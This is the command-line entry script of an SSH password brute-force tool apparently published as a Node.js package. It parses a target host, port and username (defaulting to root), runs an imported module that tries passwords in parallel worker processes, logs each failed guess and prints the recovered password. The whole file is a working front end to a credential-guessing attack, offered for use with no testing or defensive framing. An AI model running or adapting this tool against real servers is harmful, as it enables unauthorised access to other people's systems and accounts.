#!/usr/bin/env node

const options = require('minimist')(process.argv)
const humanizeDuration = require('humanize-duration')
const verticallyScaledSSHBruteForceAttack = require('.')
const startTime = Date.now()

const [, urlUser, urlHost] =
  (options._[options._.length - 1] || '').match(/([a-z0-9._-]+)@([a-z0-9._-]+)/i) || []

const host = options.host || options.h || urlHost || '127.0.0.1'
const port = options.port || options.p || 22
const timeout = parseInt(options.timeout || options.t || 1500, 10)
const username = options.username || options.u || urlUser || 'root'
const verboseInput = options.verbose || options.v
const verbose =
  verboseInput === 'false' || verboseInput === '0' || options.noVerbose
    ? false
    : Boolean(verboseInput)
const errorRetryDelay = options.errorRetryDelay || 1000
const forks = options.forks

async function verticallyScaledSSHBruteForceAttackCli() {
  try {
    const password = await verticallyScaledSSHBruteForceAttack({
      host,
      username,
      port,
      verbose,
      timeout,
      onFailure: (currentPassword, passwordIndex, forkIndex) =>
        verbose
          ? console.log(
              `Password ${currentPassword} (${passwordIndex}) fail on worker ${forkIndex}`,
            )
          : undefined,
      errorRetryDelay,
      forks,
    })

    if (verbose) {
      console.log(`Elapsed time: ${humanizeDuration(Date.now() - startTime)}`)
    }

    if (password !== null) {
      console.log(verbose ? `Password is "${password}"` : password)
    } else {
      throw new Error('Password not found!')
    }

    process.exit(0)
  } catch (error) {
    console.error(error)
    process.exit(1)
  }
}

verticallyScaledSSHBruteForceAttackCli()
